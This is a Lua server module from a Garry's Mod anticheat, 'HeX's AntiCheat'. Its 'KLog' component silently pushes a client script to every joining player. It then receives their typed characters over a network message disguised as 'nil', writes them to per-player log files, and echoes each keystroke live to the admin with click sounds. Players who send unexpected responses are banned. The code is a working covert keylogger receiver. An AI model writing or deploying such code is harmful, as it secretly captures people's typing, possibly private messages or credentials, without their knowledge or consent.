/*
    HeX's AntiCheat
    Copyright (C) 2016  MFSiNC (STEAM_0:0:17809124)
	
    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.
	
    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.
	
    You should have received a copy of the GNU General Public License along
    with this program; if not, write to the Free Software Foundation, Inc.,
    51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
*/


HAC.KLog = {
	Show = true,
}

//KLog
HAC.BCode.Add("bc_KLog.lua", "false", {over = 1} )

util.AddNetworkString("nil")

//Format time
local Last = ""
local function FormatLog(str)
	local Now = os.date("%I:%M")
	
	if Last != Now then
		Last = Now
		str = "\n["..Now.."]: "..str
	end
	
	return str
end

//Get
function HAC.KLog.Receive(len,self)
	local Char = net.ReadString()
	
	//Valid
	if not ValidString(Char) then self:FailInit("KLG_NoRX", HAC.Msg.KLG_NoRX) return end
	
	//Too long
	if #Char > 16 then self:FailInit("KLG_TooBig ("..#Char.." > 16)", HAC.Msg.KLG_TooBig) end
	
	//Format
	Char = FormatLog(Char)
	
	//Header
	local Log = self:GetLog("kl")
	if not file.Exists(Log, "DATA") then
		HAC.file.Write(Log, Format("KLog @ %s for %s\n\n", self:DateAndTime(), self:HAC_Info(nil,1) ) )
	end
	//Log
	HAC.file.Append(Log, Char)
	
	//Show
	if HAC.KLog.Show then
		MsgC(HAC.PINK, Char)
		
		//Msg & sound to HeX
		local HeX = HAC.GetHeX()
		if IsValid(HeX) then
			HeX:print(Char, true)
			HeX:HAC_SPS("ambient/machines/keyboard"..math.random(1,6).."_clicks.wav")
		end
	end
end
net.Receive("nil", HAC.KLog.Receive)


//KLog
function _R.Player:KLog(override)
	//Is HeX, don't bother!
	if self:HAC_IsHeX() or ( not self:IsReady() ) and not (override or HAC.Conf.Debug) then return end
	
	if override then
		print("[HAC] KLog OVERRIDE on "..self:Nick() )
	else
		if self:VarSet("HAC_DoneKLog") then return end
		
		print("[HAC] KLog on "..self:Nick() )
	end
	
	//Trigger
	self:BurstCode("bc_KLog.lua")
end



local States = {
	["KLog=O"] = {"OPEN", 	"ambient/materials/shutter6.wav"},
	["KLog=C"] = {"Close", 	"ambient/materials/shutter7.wav"},
}

//Gatehook
function HAC.KLog.GateHook(self,Args1)
	if Args1 == "KLog=Loaded" then
		print("[HAC] KLog on "..self:Nick().." "..Args1:upper() )
		return INIT_DO_NOTHING
	end
	
	//Tell
	if not States[ Args1 ] then
		return INIT_BAN
	end
	
	local This 	= States[ Args1 ]
	local State = "Console: "..This[1].." - "..self:Nick()
	HAC.TellHeX(State, NOTIFY_GENERIC, 6, This[2] )
	HAC.Print2HeX(State.."\n")
	
	return INIT_DO_NOTHING
end
HAC.Init.GateHook("KLog=", HAC.KLog.GateHook)





//Ready
function HAC.KLog.Ready(self)
	self:KLog()
end
hook.Add("HACPlayerReady", "HAC.KLog.Ready", HAC.KLog.Ready)
--hook.Add("HACReallySpawn", "HAC.KLog.Ready", HAC.KLog.Ready)


//Show
function HAC.KLog.Toggle(self,cmd,args)
	if IsValid(self) and not self:HAC_IsHeX() then return end
	
	HAC.KLog.Show = not HAC.KLog.Show
	self:print("! Show: "..tostring(HAC.KLog.Show) )
end
concommand.Add("show", HAC.KLog.Toggle)















